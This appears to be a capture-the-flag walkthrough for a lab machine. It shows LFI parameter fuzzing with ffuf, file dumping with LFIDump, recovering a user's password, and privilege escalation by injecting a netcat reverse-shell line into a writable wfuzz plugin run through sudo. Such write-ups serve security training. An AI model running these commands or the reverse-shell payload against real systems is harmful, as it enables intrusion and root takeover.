# Initial Scans
* ports 22 and 80 are open
* there is nothing on the webserver that we can find aside from index.php
* we did LFI parameter name fuzzing, and the valid parameter name found was "include"

ffuf -u "http://10.0.2.36/index.php?FUZZ=../../../../../../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 361

https://github.com/p0dalirius/LFIDump

we use the LFIDump tool to dump all interesting files from the webserver

But we have to add some custom file paths to the wordlist:

https://github.com/theshyhat/ctf_documents/blob/main/scripts/web_hacking/all_plus_proc.txt

python LFIDump.py -u "http://10.0.2.36/index.php?include=../../../../../../../LFIPATH" -F wordlists/all.txt -D ./

# Foothold Access

After dumping the files, we can search for credentials belonging to the ben user by grepping with the following pattern:

grep -r -e "ben:" .

This reveals a password for ben:B3nP4zz

# Privilege Escalation

on login to the server, we find that our user has sudo access as root to the wfuzz program

Wfuzz uses scripts in its execution

If we can locate a writable script in the wfuzz script directory, then we can  leverage that to perform dependency injection.

find /usr/lib/python3/dist-packages/wfuzz -type f -writable 2>/dev/null

This script is writable:

/usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py

So we can add the following code to the start of the range.py script to send a reverse shell

```
import os
os.system("nc 10.0.2.22 443 -e /bin/bash")
```

Then run the wfuzz command with sudo:

sudo wfuzz -z range,1,10 -z range,20,30 http://localhost/page?id=FUZZ1&cat=FUZZ2




